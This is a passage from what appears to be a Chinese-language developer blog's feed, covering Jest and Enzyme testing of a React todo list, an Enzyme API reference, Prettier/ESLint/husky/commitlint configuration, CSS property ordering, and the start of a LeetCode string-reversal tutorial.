// undoList.forEach((item, itemIndex) =&gt; &#123; // if (itemIndex === index) &#123; // Object.assign(item, &#123; status: 'input' &#125;) // return; // &#125; Object.assign(item, &#123; status: 'div' &#125;) // &#125;) const newList = undoList.map((item, itemIndex) =&gt; &#123; if (itemIndex === index) &#123; return &#123; ...item, status: 'input' &#125; &#125; return &#123; ...item, status: 'div' &#125; &#125;) this.setState(&#123; undoList: newList &#125;) &#125; handleBlur = (index) =&gt; &#123; const &#123; undoList &#125; = this.state; const newList = undoList.map(item =&gt; &#123; return &#123; ...item, status: 'div' &#125; &#125;) this.setState(&#123; undoList: newList &#125;) &#125; handleInputValue = (index, value) =&gt; &#123; const &#123; undoList &#125; = this.state; const newList = undoList.map((item, itemIndex) =&gt; &#123; if (itemIndex === index) &#123; return &#123; ...item, value &#125; &#125; return &#123; ...item, &#125; &#125;) this.setState(&#123; undoList: newList &#125;) &#125; addUndoItem = (value) =&gt; &#123; const &#123; undoList &#125; = this.state; this.setState(&#123; undoList: [...undoList, &#123; status: 'div', value &#125;] &#125;) &#125; render() &#123; const &#123; undoList &#125; = this.state; return ( &lt;div className=&#123;styles.todoList&#125;&gt; &lt;Header addUndoItem=&#123;this.addUndoItem&#125; /&gt; &lt;UndoList list=&#123;undoList&#125; deleteItem=&#123;this.handledeleteItem&#125; changeStatus=&#123;this.handleStatusChange&#125; changeBlur=&#123;this.handleBlur&#125; valueChange=&#123;this.handleInputValue&#125; /&gt; &lt;/div&gt; ) &#125;&#125;export default TodoList; src/index.js 1234567891011import React from 'react';import ReactDOM from 'react-dom';import &#123; Provider &#125; from 'react-redux';import App from './App';import store from './store/createStore'ReactDOM.render(( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt;), document.getElementById('root')); 然后修改集成测试的测试用例 src/containers/TodoList/__test__/integration/TodoList.test.js 1234567891011121314151617181920212223242526272829303132333435363738394041import React from 'react';import &#123; mount &#125; from 'enzyme';import TodoList from './../../index';// 增加的内容import &#123; Provider &#125; from 'react-redux';import store from './../../../../store/createStore';describe('集成测试：TodoList', () =&gt; &#123; let wrapper; beforeEach(() =&gt; &#123; wrapper = mount( &lt;Provider store=&#123;store&#125;&gt; &lt;TodoList /&gt; &lt;/Provider&gt; ) &#125;) it(` 1.用户会在 header输入框输入内容 2.用户会点击回车按钮 3.列表项应该增加用户输入内容的列表项 `, () =&gt; &#123; const value = 'haha' const headerInput = wrapper.find('[data-test="header-input"]') headerInput.simulate('change', &#123; target: &#123; value &#125; &#125;) // 按下回车键，keyCode为13 headerInput.simulate('keyUp', &#123; keyCode: 13 &#125;) // undoListItem const listItems = wrapper.find('[data-test="list-item"]') expect(listItems.length).toBe(1) expect(listItems.at(0).text()).toContain(value) &#125;)&#125;) 异步代码compontDidMount1234567891011121314151617componentDidMount()&#123; /* &#123; data:[ &#123;status:'div',value:'haha'&#125;, ], success:true &#125; */ axios.get('/undoList.json').then(res=&gt;&#123; this.setState(&#123; undoList:res.data &#125;) &#125;).catch(e=&gt;&#123; console.log(e) &#125;)&#125; 模拟函数 src/__mock__/axios.js 123456789101112131415const mockUndoList = &#123; data:[&#123; status:'div',value:'haha' &#125;], success:true&#125;export default &#123; get(url)&#123; if(url === '/undoList.json')&#123; return new Promise((resolve,reject)=&gt;&#123; resolve(mockUndoList) &#125;) &#125; &#125;&#125; 测试用例 12345678910111213141516171819202122232425it(` 1.用户打开页面 2.应该展示接口返回的数据`,(done)=&gt;&#123; const wrapper = mount( &lt;Provider store=&#123;store&#125;&gt; &lt;TodoList /&gt; &lt;/Provider&gt; // 解决数据异步问题 setTimeout(()=&gt;&#123; wrapper.update(); const listItems = wrapper.find('[data-test="list-item"]') expect(listItems.length).toBe(1) done() &#125;,0) // node的语法 process.nextTick(()=&gt;&#123; wrapper.update(); const listItems = wrapper.find('[data-test="list-item"]') expect(listItems.length).toBe(1) done() &#125;) )&#125;) setTimeout12345678910111213141516171819componentDidMount()&#123; /* &#123; data:[ &#123;status:'div',value:'haha'&#125;, ], success:true &#125; */ setTimeout(()=&gt;&#123; axios.get('/undoList.json').then(res=&gt;&#123; this.setState(&#123; undoList:res.data &#125;) &#125;).catch(e=&gt;&#123; console.log(e) &#125;) &#125;,5000)&#125; 测试用例 1234567891011121314151617181920212223jest.useFakeTimers();it(` 1.用户打开页面 2.应该展示接口返回的数据`,(done)=&gt;&#123; const wrapper = mount( &lt;Provider store=&#123;store&#125;&gt; &lt;TodoList /&gt; &lt;/Provider&gt; expect(setTimeout).toHaveBeenCalledTimes(1); // 跑完所有 setTimeout 的时间 jest.runAllTimers(); // 解决数据异步问题 setTimeout(()=&gt;&#123; wrapper.update(); const listItems = wrapper.find('[data-test="list-item"]') expect(listItems.length).toBe(1) done() &#125;,0) )&#125;) 前端自动化测试的优势 更好的代码组织，项目的可维护性增强 更小的bug 出现概率，尤其是回归测试中的 Bug 修改工程质量差的项目，更加安全 项目具备潜在的文档特性 扩广前端的知识面 EnzymeEnzyme 是 React 的 JavaScript 测试应用程序，可以轻松测试 React Components 的输出。还可以在给定输出的情况下，遍历以某种方式模拟运行。 主要通过模仿 Jq 用于 DOM 操作和遍历 APIat(index).at(index) =&gt; shallowWrapper 返回当前 wrapper 中指定索引的节点 12const wrapper = shallow(&lt;MyComponent /&gt;)expect(wrapper.find(foo).at(0).props().foo).toEqual('bar') first().first() =&gt; ShallowWrapper 将匹配节点集合减少到集合中的第一个，就像.at(0)。 1expect(wrapper.find(Foo).first().props().foo).to.equal('bar'); last().last() =&gt; ShallowWrapper 将匹配节点集减少到集合中的最后一个，就像.at(length - 1)。 12const wrapper = shallow(&lt;MyComponent /&gt;);expect(wrapper.find(Foo).last().props().foo).to.equal('bar'); childAt(index).childAt(index) =&gt; ShallowWrapper 返回指定索引的子节点 12const wrapper = shallow(&lt;TodoList items=&#123;items&#125;/&gt;);expect(wrapper.find('ul').childAt(0).type).toEqual('li') children([selector]).children([selector]) =&gt; ShallowWrapper 返回父节点某个元素的所有子节点 12const wrapper = shallow(&lt;TodoList items=&#123;items&#125;/&gt;);expect(wrapper.find('ul').children.length).toEqual(items.length) closest(selector).closest(selector) =&gt; shallowWrapper 通过遍历节点祖先，返回第一个相匹配的节点 12const wrapper = shallow(&lt;MyComponent /&gt;);expect(wrapper.find(Foo).closest('.bar')).to.have.lengthOf(1); contains(nodeOrNodes).contains(nodeOrNodes) =&gt; Boolean 返回所有给定的react元素是否与渲染树中的元素匹配。它将通过检查期望元素是否与包装器元素具有相同的 props 并共享相同的值来确定包装器中的元素是否与预期元素匹配。 12345678910111213141516171819202122232425262728293031let wrapper;wrapper = shallow(( &lt;div&gt; &lt;div data-foo="foo" data-bar="bar"&gt;Hello&lt;/div&gt; &lt;/div&gt;));expect(wrapper.contains(&lt;div data-foo="foo" data-bar="bar"&gt;Hello&lt;/div&gt;)).to.equal(true);expect(wrapper.contains(&lt;div data-foo="foo"&gt;Hello&lt;/div&gt;)).to.equal(false);expect(wrapper.contains(&lt;div data-foo="foo" data-bar="bar" data-baz="baz"&gt;Hello&lt;/div&gt;)).to.equal(false);expect(wrapper.contains(&lt;div data-foo="foo" data-bar="Hello"&gt;Hello&lt;/div&gt;)).to.equal(false);expect(wrapper.contains(&lt;div data-foo="foo" data-bar="bar" /&gt;)).to.equal(false);wrapper = shallow(( &lt;div&gt; &lt;span&gt;Hello&lt;/span&gt; &lt;div&gt;Goodbye&lt;/div&gt; &lt;span&gt;Again&lt;/span&gt; &lt;/div&gt;));expect(wrapper.contains([ &lt;span&gt;Hello&lt;/span&gt;, &lt;div&gt;Goodbye&lt;/div&gt;,])).to.equal(true);expect(wrapper.contains([ &lt;span&gt;Hello&lt;/span&gt;, &lt;div&gt;World&lt;/div&gt;,])).to.equal(false); containsAllMatchingElements(patternNodes).containsAllMatchingElements(patternNodes) =&gt; Boolean 返回所有给定的react元素是否patternNodes与包装器的渲染树中的元素匹配。每个元素patternNodes必须匹配一次或多次。匹配遵循规则containsMatchingElement。 12345678910111213const style = &#123; fontSize: 13 &#125;;const wrapper = shallow(( &lt;div&gt; &lt;span className="foo"&gt;Hello&lt;/span&gt; &lt;div style=&#123;style&#125;&gt;Goodbye&lt;/div&gt; &lt;span&gt;Again&lt;/span&gt; &lt;/div&gt;));expect(wrapper.containsAllMatchingElements([ &lt;span&gt;Hello&lt;/span&gt;, &lt;div&gt;Goodbye&lt;/div&gt;,])).to.equal(true); containsAnyMatchingElements(patternNodes).containsAnyMatchingElements(patternNodes) =&gt; Boolean 返回至少一个给定的react元素是否patternNodes与包装器的渲染树中的元素匹配。一个或多个元素patternNodes必须匹配一次或多次。匹配遵循规则containsMatchingElement。 12345678910111213const style = &#123; fontSize: 13 &#125;;const wrapper = shallow(( &lt;div&gt; &lt;span className="foo"&gt;Hello&lt;/span&gt; &lt;div style=&#123;style&#125;&gt;Goodbye&lt;/div&gt; &lt;span&gt;Again&lt;/span&gt; &lt;/div&gt;));expect(wrapper.containsAnyMatchingElements([ &lt;span&gt;Bonjour&lt;/span&gt;, &lt;div&gt;Goodbye&lt;/div&gt;,])).to.equal(true); containsMatchingElement(patternNode).containsMatchingElement(patternNode) =&gt; Boolean 返回patternNodereact元素是否与渲染树中的任何元素匹配。 123456789101112const wrapper = shallow(( &lt;div&gt; &lt;div data-foo="foo" data-bar="bar"&gt;Hello&lt;/div&gt; &lt;/div&gt;));expect(wrapper.containsMatchingElement(&lt;div data-foo="foo" data-bar="bar"&gt;Hello&lt;/div&gt;)).to.equal(true);expect(wrapper.containsMatchingElement(&lt;div data-foo="foo"&gt;Hello&lt;/div&gt;)).to.equal(true);expect(wrapper.containsMatchingElement(&lt;div data-foo="foo" data-bar="bar" data-baz="baz"&gt;Hello&lt;/div&gt;)).to.equal(false);expect(wrapper.containsMatchingElement(&lt;div data-foo="foo" data-bar="Hello"&gt;Hello&lt;/div&gt;)).to.equal(false);expect(wrapper.containsMatchingElement(&lt;div data-foo="foo" data-bar="bar" /&gt;)).to.equal(false); context([key])返回包装器根节点的上下文哈希。可选地传入一个props，它将只返回该值。 123456const wrapper = shallow( &lt;MyComponent /&gt;, &#123; context: &#123; foo: 10 &#125; &#125;,);expect(wrapper.context().foo).to.equal(10);expect(wrapper.context('foo')).to.equal(10); debug([options]).debug([options]) =&gt; String 返回包装器的类似HTML的字符串，以便进行调试。当测试没有通过时，打印到控制台很有用。 options（Object[可选]）： options.ignoreProps：（Boolean[可选]）：是否应在结果字符串中省略props。默认情况下包含道具。 options.verbose：（Boolean[可选]）：是否应该详细打印作为道具传递的数组和对象。 dive([options]).dive([options]) =&gt; ShallowWrapper 浅呈现当前包装器的一个非DOM子项，并返回结果周围的包装器。它必须是单节点包装器，并且该节点必须是React组件。 注意：只能在单个非DOM组件元素节点的包装上调用，否则会引发错误。如果必须使用多个子节点对包装器进行浅包装，请使用.shallow（） 123456789101112131415161718function Bar() &#123; return ( &lt;div&gt; &lt;div className="in-bar" /&gt; &lt;/div&gt; );&#125;function Foo() &#123; return ( &lt;div&gt; &lt;Bar /&gt; &lt;/div&gt; );&#125;const wrapper = shallow(&lt;Foo /&gt;);expect(wrapper.find('.in-bar')).to.have.lengthOf(0);expect(wrapper.find(Bar)).to.have.lengthOf(1);expect(wrapper.find(Bar).dive().find('.in-bar')).to.have.lengthOf(1); equals(node).equals(node) =&gt; Boolean 返回当前包装器根节点呈现树是否与传入的树相似 12const wrapper = shallow(&lt;MyComponent /&gt;);expect(wrapper.equals(&lt;div className="foo bar" /&gt;)).to.equal(true); every(selector).every(selector) =&gt; Boolean 返回包装器中的所有节点是否与提供的选择器匹配。 12345678910const wrapper = shallow(( &lt;div&gt; &lt;div className="foo qoo" /&gt; &lt;div className="foo boo" /&gt; &lt;div className="foo hoo" /&gt; &lt;/div&gt;));expect(wrapper.find('.foo').every('.foo')).to.equal(true);expect(wrapper.find('.foo').every('.qoo')).to.equal(false);expect(wrapper.find('.foo').every('.bar')).to.equal(false); everyWhere(fn).everyWhere(fn) =&gt; Boolean 12345678910const wrapper = shallow(( &lt;div&gt; &lt;div className="foo qoo" /&gt; &lt;div className="foo boo" /&gt; &lt;div className="foo hoo" /&gt; &lt;/div&gt;));expect(wrapper.find('.foo').everyWhere(n =&gt; n.hasClass('foo'))).to.equal(true);expect(wrapper.find('.foo').everyWhere(n =&gt; n.hasClass('qoo'))).to.equal(false);expect(wrapper.find('.foo').everyWhere(n =&gt; n.hasClass('bar'))).to.equal(false); exists([selector]).exists([selector]) =&gt; Boolean 返回包装器中是否存在任何节点。或者，如果传入选择器，则该选择器是否在包装器中具有任何匹配项。 123const wrapper = mount(&lt;div className="some-class" /&gt;);expect(wrapper.exists('.some-class')).to.equal(true);expect(wrapper.find('.other-class').exists()).to.equal(false); filter(selector).filter(selector) =&gt; ShallowWrapper 返回一个新的包装器，其中只包含与提供的选择器匹配的当前包装器的节点。 12const wrapper = shallow(&lt;MyComponent /&gt;);expect(wrapper.find('.foo').filter('.bar')).to.have.lengthOf(1); filterWhere(fn).filterWhere(fn) =&gt; ShallowWrapper 返回一个新的包装器，它只包含当前包装器的节点，当传递给提供的谓词函数时，返回true 123const wrapper = shallow(&lt;MyComponent /&gt;);const complexFoo = wrapper.find('.foo').filterWhere(n =&gt; typeof n.type() !== 'string');expect(complexFoo).to.have.lengthOf(4); find(selector).find(selector) =&gt; ShallowWrapper 查找当前包装器的呈现树中与提供的选择器匹配的每个节点。 123456789101112131415161718192021import Foo from '../components/Foo';const wrapper = shallow(&lt;MyComponent /&gt;);expect(wrapper.find('.foo')).to.have.lengthOf(1);expect(wrapper.find('.bar')).to.have.lengthOf(3);// compound selectorexpect(wrapper.find('div.some-class')).to.have.lengthOf(3);// CSS id selectorexpect(wrapper.find('#foo')).to.have.lengthOf(1);// 组件expect(wrapper.find(Foo)).to.have.lengthOf(1);// 组件显示名称expect(wrapper.find('Foo')).to.have.lengthOf(1);// 对象属性选择器expect(wrapper.find(&#123; prop: 'value' &#125;)).to.have.lengthOf(1); findWhere(fn).findWhere(fn) =&gt; ShallowWrapper 查找渲染树中为提供的谓词函数返回true的每个节点。 123const wrapper = shallow(&lt;MyComponent /&gt;);const complexComponents = wrapper.findWhere(n =&gt; n.type() !== 'string');expect(complexComponents).to.have.lengthOf(8); forEach(fn).forEach(fn) =&gt; Self 迭代当前包装器的每个节点，并使用围绕作为第一个参数传入的相应节点的包装器执行提供的函数。 1234567891011const wrapper = shallow(( &lt;div&gt; &lt;div className="foo bax" /&gt; &lt;div className="foo bar" /&gt; &lt;div className="foo baz" /&gt; &lt;/div&gt;));wrapper.find('.foo').forEach((node) =&gt; &#123; expect(node.hasClass('foo')).to.equal(true);&#125;); get(index).get(index) =&gt; ReactElement 12const wrapper = shallow(&lt;MyComponent /&gt;);expect(wrapper.find(Foo).get(0).props.foo).to.equal('bar'); getWrappingComponent().getWrappingComponent() =&gt; ShallowWrapper 如果wrappingComponent传入了a options，则此方法返回ShallowWrapper渲染的周围wrappingComponent。这ShallowWrapper可以用来更新wrappingComponent props，state等。 123456789101112131415161718192021222324252627282930import &#123; Provider &#125; from 'react-redux';import &#123; Router &#125; from 'react-router';import store from './my/app/store';import mockStore from './my/app/mockStore';function MyProvider(props) &#123; const &#123; children, customStore &#125; = props; return ( &lt;Provider store=&#123;customStore || store&#125;&gt; &lt;Router&gt; &#123;children&#125; &lt;/Router&gt; &lt;/Provider&gt; );&#125;MyProvider.propTypes = &#123; children: PropTypes.node, customStore: PropTypes.shape(&#123;&#125;),&#125;;MyProvider.defaultProps = &#123; children: null, customStore: null,&#125;;const wrapper = shallow(&lt;MyComponent /&gt;, &#123; wrappingComponent: MyProvider,&#125;);const provider = wrapper.getWrappingComponent();provider.setProps(&#123; customStore: mockStore &#125;); getElement().getElement() =&gt; ReactElement 返回包装的ReactElement。如果当前包装器正在包装根组件，则返回根组件的最新呈现输出。 12345678910111213const element = ( &lt;div&gt; &lt;span /&gt; &lt;span /&gt; &lt;/div&gt;);function MyComponent() &#123; return element;&#125;const wrapper = shallow(&lt;MyComponent /&gt;);expect(wrapper.getElement()).to.equal(element); getElements().getElements() =&gt; Array&lt;ReactElement&gt; 1234567891011121314const one = &lt;span /&gt;;const two = &lt;span /&gt;;function Test() &#123; return ( &lt;div&gt; &#123;one&#125; &#123;two&#125; &lt;/div&gt; );&#125;const wrapper = shallow(&lt;Test /&gt;);expect(wrapper.find('span').getElements()).to.deep.equal([one, two]); hasClass(className).hasClass(className) =&gt; Boolean 返回包装节点是否具有className包含传入的类名称的prop。它必须是单节点包装器。 12345const wrapper = shallow(&lt;MyComponent /&gt;);expect(wrapper.find('.my-button').hasClass('disabled')).to.equal(true);// 正则expect(wrapper.find('.my-button').hasClass(/(ComponentName)-(other)-(\d+)/)).to.equal(true); hostNodes().hostNodes() =&gt; ShallowWrapper 返回仅包含主机节点的新包装器。当使用react-dom，主机节点是HTML元素，而不是定制反应的组分 12345678const wrapper = shallow(( &lt;div&gt; &lt;MyComponent className="foo" /&gt; &lt;span className="foo" /&gt; &lt;/div&gt;));const twoNodes = wrapper.find('.foo');expect(twoNodes.hostNodes()).to.have.lengthOf(1); html().html() =&gt; String 返回整个当前渲染树（不仅仅是浅渲染部分）的渲染HTML标记的字符串。只能在单个节点的包装器上调用 123456789101112131415161718function Foo() &#123; return (&lt;div className="in-foo" /&gt;);&#125;function Bar() &#123; return ( &lt;div className="in-bar"&gt; &lt;Foo /&gt; &lt;/div&gt; );&#125;const wrapper = shallow(&lt;Bar /&gt;);expect(wrapper.html()).to.equal('&lt;div class="in-bar"&gt;&lt;div class="in-foo"&gt;&lt;/div&gt;&lt;/div&gt;');expect(wrapper.find(Foo).html()).to.equal('&lt;div class="in-foo"&gt;&lt;/div&gt;');const wrapper = shallow(&lt;div&gt;&lt;b&gt;important&lt;/b&gt;&lt;/div&gt;);expect(wrapper.html()).to.equal('&lt;div&gt;&lt;b&gt;important&lt;/b&gt;&lt;/div&gt;'); instance().instance() =&gt; ReactComponent 返回单节点包装器节点的底层类实例; this在它的方法。 1234567891011121314151617181920212223function Stateless() &#123; return &lt;div&gt;Stateless&lt;/div&gt;;&#125;class Stateful extends React.Component &#123; render() &#123; return &lt;div&gt;Stateful&lt;/div&gt;; &#125;&#125;test('shallow wrapper instance should be null', () =&gt; &#123; const wrapper = shallow(&lt;Stateless /&gt;); const instance = wrapper.instance(); expect(instance).to.equal(null);&#125;);test('shallow wrapper instance should not be null', () =&gt; &#123; const wrapper = shallow(&lt;Stateful /&gt;); const instance = wrapper.instance(); expect(instance).to.be.instanceOf(Stateful);&#125;); is(selector).is(selector) =&gt; Boolean 返回单个包装节点是否与提供的选择器匹配。它必须是单节点包装器。 12const wrapper = shallow(&lt;div className="some-class other-class" /&gt;);expect(wrapper.is('.some-class')).to.equal(true); isEmptyRender().isEmptyRender() =&gt; Boolean 返回包装器是否最终只呈现允许的假值：false或null。 123456function Foo() &#123; return null;&#125;const wrapper = shallow(&lt;Foo /&gt;);expect(wrapper.isEmptyRender()).to.equal(true); key().key() =&gt; String 返回当前包装器节点的键值。它必须是单节点包装器。 1234567const wrapper = shallow(( &lt;ul&gt; &#123;['foo', 'bar'].map(s =&gt; &lt;li key=&#123;s&#125;&gt;&#123;s&#125;&lt;/li&gt;)&#125; &lt;/ul&gt;)).find('li');expect(wrapper.at(0).key()).to.equal('foo');expect(wrapper.at(1).key()).to.equal('bar'); map(fn).map(fn) =&gt; Array&lt;Any&gt; 将当前节点数组映射到另一个数组。每个节点作为a传递ShallowWrapper 给map函数。 12345678910const wrapper = shallow(( &lt;div&gt; &lt;div className="foo"&gt;bax&lt;/div&gt; &lt;div className="foo"&gt;bar&lt;/div&gt; &lt;div className="foo"&gt;baz&lt;/div&gt; &lt;/div&gt;));const texts = wrapper.find('.foo').map(node =&gt; node.text());expect(texts).to.eql(['bax', 'bar', 'baz']); matchesElement(patternNode).matchesElement(patternNode) =&gt; Boolean 回给定的react元素是否patternNode与包装器的渲染树匹配。它必须是单节点包装器，并且仅检查根节点。 这些patternNode行为就像一张通配符。为了匹配包装器中的节点： 标签名称必须匹配 内容必须匹配：在文本节点中，前导和尾随空格被忽略，但中间空间不被忽略。子元素必须根据这些规则以递归方式匹配。 patternNodeprops（attributes）必须出现在包装器的节点中，而不是相反。如果它们出现，它们的值必须匹配。 patternNode样式CSS属性必须出现在包装器节点的样式中，而不是相反。如果它们出现，它们的值必须匹配。 1234567891011121314151617181920class MyComponent extends React.Component &#123; constructor(props) &#123; super(props); this.handleClick = this.handleClick.bind(this); &#125; handleClick() &#123; // ... &#125; render() &#123; return ( &lt;button type="button" onClick=&#123;this.handleClick&#125; className="foo bar"&gt;Hello&lt;/button&gt; ); &#125;&#125;const wrapper = shallow(&lt;MyComponent /&gt;);expect(wrapper.matchesElement(&lt;button&gt;Hello&lt;/button&gt;)).to.equal(true);expect(wrapper.matchesElement(&lt;button className="foo bar"&gt;Hello&lt;/button&gt;)).to.equal(true); name().name() =&gt; String|null 返回此包装器的当前节点的名称。如果它是复合组件，则这将是最顶层渲染组件的名称。如果它是本机DOM节点，则它将是标记名称的字符串。如果是的话null，那就是null。 返回名称的优先顺序是：type.displayName- &gt; type.name- &gt; type。 123456789101112131415const wrapper = shallow(&lt;div /&gt;);expect(wrapper.name()).to.equal('div');function SomeWrappingComponent() &#123; return &lt;Foo /&gt;;&#125;const wrapper = shallow(&lt;SomeWrappingComponent /&gt;);expect(wrapper.name()).to.equal('Foo');Foo.displayName = 'A cool custom name';function SomeWrappingComponent() &#123; return &lt;Foo /&gt;;&#125;const wrapper = shallow(&lt;SomeWrappingComponent /&gt;);expect(wrapper.name()).to.equal('A cool custom name'); 参考链接 前端要学的测试课 从Jest入门到TDD/BDD双实战 jest 官方文档 enzyme官方文档]]></content>
      <categories>
        <category>测试</category>
      </categories>
      <tags>
        <tag>测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工欲善其事，必先利其器(eslint+prettier)]]></title>
    <url>%2F2019-08-08-%E5%B7%A5%E6%AC%B2%E5%96%84%E5%85%B6%E4%BA%8B%EF%BC%8C%E5%BF%85%E5%85%88%E5%88%A9%E5%85%B6%E5%99%A8(eslint%2Bprettier).html</url>
    <content type="text"><![CDATA[工欲善其事，必先利其器(eslint+prettier)Prettier官网 什么叫Prettier？Prettier是一个固定的代码格式化程序，支持： JavaScript，包括ES2017 JSX Angular Vue Flow TS CSS，Less和SCSS HTML JSON GraphQL Markdown，包括GFM和MDX YAML 安装123456789# yarnyarn add prettier --dev --exact# 全局yarn global add prettier# npmnpm install --save-dev --save-exact prettier# 全局npm install --global prettier 基本配置12345678910111213141516171819202122232425262728&#123; // 排版宽度,即每行最大宽度，默认值是80 "printWidth":100, // 制表符宽度，每个层级缩进几个空格，默认值为2 "tabWidth": 2, // 是否使用 tab 替代 space 为单位缩进，默认值为false "useTabs": false, // 分号，句尾是否自动补全分号，默认为true "semi": true, // 启用双引号，不启用单引号,默认为true "singleQuote": true, // 在 JSX 文件中使用单引号替代双引号，默认为 false "jsxSingleQuote": true, // 为多行数组的非末尾添加逗号（单行数组不需要逗号），数值：none(不添加逗号)、es5(在ES5中生效的逗号，对象数组等)，all(任何可以添加逗号的地方) "trailingComma": "es5", // 括号空格，在对象字面量和括号之间添加空格，默认为 true "bracketSpacing": true, // 将多行 JSX 元素的 &gt; 放置于最后一行的末尾，而非换行。默认为 false "jsxBracketSameLine": false, // 箭头函数圆括号，默认为 avoid(在可以消除的情况下，消除括号)，always(一直保留括号) "arrowParens": "avoid", "overrides": [ &#123; "files": ".prettierrc", "options": &#123; "parser": "json" &#125; &#125; ]&#125; Eslint代码规范变量命名命名必须传递足够的信息。fetchUserInfoAsync比getData更加具体 命名基础 半自动构建huskyHusky 可以阻止无效的 git commit、git push以及其他woff行为 1npm install husky --save-dev lint-staged针对暂存的git文件运行linters并且不要让💩滑入你的代码库！ 1npm install lint-staged --save-dev commitlint规范 commit message,便于自动生成 CHANGELOG 1npm install commitlint @commitlint/cli @commitlint/config-conventional --save-dev 配置： 12345678910111213141516171819202122// commitlint.config.jsmodule.exports = &#123; extends: ["@commitlint/config-conventional"], rules: &#123; "type-enum": [ 2, "always", ["feat", "fix", "docs", "style", "refactor", "test", "chore", "revert"] ], "subject-full-stop": [0, "never"], "subject-case": [0, "never"] &#125;&#125;/** * feat：新功能（feature） * fix：修补bug * docs：文档（documentation） * style： 格式（不影响代码运行的变动） * refactor：重构（即不是新增功能，也不是修改bug的代码变动） * test：增加测试 * chore：构建过程或辅助工具的变动*/ conventional-changelog自动生成 CHANGELOG 1npm install conventional-changelog conventional-changelog-cli --save-dev package.json1234567891011121314151617181920212223242526272829&#123; "scripts": &#123; "start": "concurrently \"node scripts/start.js\" \"npm run mock\"", "build": "node scripts/build.js", "test": "node scripts/test.js", "eslint": "eslint --fix **/*.js", "prettier": "prettier --write ./src/**/**/**/*", "mock": "json-server --watch db.json --port 3004", "changelog": "conventional-changelog -p angular -i CHANGELOG.md -s -r 0" &#125;, "husky": &#123; "hooks": &#123; "pre-commit": "lint-staged", "commit-msg": "commitlint -E HUSKY_GIT_PARAMS" &#125; &#125;, "lint-staged": &#123; "src/**/*.&#123;jsx,txs,ts,js,json,css,md&#125;": [ "prettier --write ./src/**/**/**/*", "eslint --fix **/*.js", "git add" ] &#125;, "config": &#123; "commitizen": &#123; "path": "cz-customizable" &#125; &#125;, &#125; commit&amp;push1234567891011121314151617181920212223242526272829303132# 当有新的改变git add .# 提交，输入不规范的提交信息，先校验代码， 提示不规范，并且不通过git commit -m "test"# 输入规范信息，规范自行百度，也可以从 commitlint.config.js中看出。运行钩子自动prettier，接着运行 eslint,没有报错则 git add，并开始校验提交信息是否规范，无误后顺利提交git commit -m "feat: add semi-automatic construction"husky &gt; pre-commit (node v10.15.3)Stashing changes... [started]Stashing changes... [skipped]→ No partially staged files found...Running tasks... [started]Running tasks for src/**/*.&#123;jsx,txs,ts,js,json,css,md&#125; [started]prettier --write ./src/**/**/**/* [started]prettier --write ./src/**/**/**/* [completed]eslint --fix **/*.js [started]eslint --fix **/*.js [completed]git add [started]git add [completed]Running tasks for src/**/*.&#123;jsx,txs,ts,js,json,css,md&#125; [completed]Running tasks... [completed]husky &gt; commit-msg (node v10.15.3)[master 9afdd76] test: lint-staged 1 file changed, 1 insertion(+) # 推送到 orgingit push# 生成 changelognpm run changelog&gt; conventional-changelog -p angular -i CHANGELOG.md -s -r 0 CSS样式顺序相关属性应该为一组，可以以下面的样式为编写顺序 Positioning Box model Typographic Visual 123456789101112131415161718192021222324252627282930.declaration-order&#123; /* Positioning */ position: absolute; top: 0; right: 0; bottom: 0; left: 0; z-index: 100; /* Box model */ display:block; box-sizing: border-box; width: 100px; height: 100px; padding: 10px; border: 1px solid #666; border-radius: 5px; margin: 10px; float: right; overflow: hidden; /* Typographic */ font: normal 12px 'Helvetica Neue',sans-serif; line-height: 1.5; text-align: center; /* Visual */ background-color: #333; color: #fff; opacity: 0.8; /* Other */ cursor: pointer;&#125; 参考链接： 编写「可读」代码的实践 前端开发规范之命名规范、html规范、css规范、js规范 Prettier eslint airbnb规范 eslint-plugin-react eslint-config-alloy eslint-plugin-jsx-a11y husky lint-staged commitlint]]></content>
      <categories>
        <category>规范</category>
      </categories>
      <tags>
        <tag>规范</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从leetCode学习JavaScript数据结构与基础算法]]></title>
    <url>%2F2019-07-03-%E4%BB%8EleetCode%E5%AD%A6%E4%B9%A0JavaScript%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95.html</url>
    <content type="text"><![CDATA[循序渐进，保持空杯 从leetCode学习JavaScript数据结构与基础算法简单算法： 字符串、数组、正则、排序、递归 字符串反转字符串中的单词③ 给定一个字符串，需要反转字符串中每个单词的字符顺序，同时仍保留空格和单词的初始顺序 实例： 12输入："Let's take LeetCode contest"输出："s'teL ekat edoCteeL tsetnoc" 注意：在字符串中，每个单词由单个空格分隔，并且字符串中不会有任何额外的空格 123456789101112131415/*** @param &#123;string&#125; s* @return &#123;string&#125;*/const reverseWords = function(s)&#123; // 1.字符串按空格进行分隔，数组的元素的先后顺序就是单词的顺序 // 2.遍历数组的元素，也就是每个单词String，通过 split分隔转Array 同时用Array 自带的 reverse方法将每个单词数组分隔后产生的数组反转 // 3.接着用join('')将单词数组中的每个数组拼凑成字符串 // 4.最后将字符串单词数组拼凑为最终的字符串 return s.split(' ').map(i=&gt;i.split('').reverse().join('')).join(' ') // 或者用正则，匹配空格 return s.split(/\s/g).map(i=&gt;i.split('').reverse().join('')).join(' ') // 匹配单词(match) return s.match(/[\w']+/g).map(i=&gt;i.split('').reverse().join('')).join(' ')&#125; 测试用例： 12345import reverseByWord from '../../code/string/lession1'test('reverseByWord:Let\'s take LeetCode contest', () =&gt; &#123; expect(reverseByWord("Let's take LeetCode contest")).toBe("s'teL ekat edoCteeL tsetnoc")&#125;) 知识点： String.prototype.split、String.prototype.match、Array.prototype.map、Array.prototype.reverse、Array.prototype.join 扩展：上面讲的是单个空格隔开，那如果不是当个空格呢？ 1234567// 同样可以使用正则的贪婪匹配来解决const reverseWords = function(s)&#123; // 或者用正则，匹配空格 return s.split(/\s+/g).map(i=&gt;i.split('').reverse().join('')).join(' ') // 匹配单词(match) return s.match(/[\w']+/g).map(i=&gt;i.split('').reverse().join('')).join(' ')&#125; 计数二进制子串 给定一个字符串 s，计算具有相同数量 0 和 1的非空（连续）子符串的数量，并且这些子字符串中的所有 0 和 1 都是组合在一起的。 重复出现的子串要计算它们出现的次数。 示例： 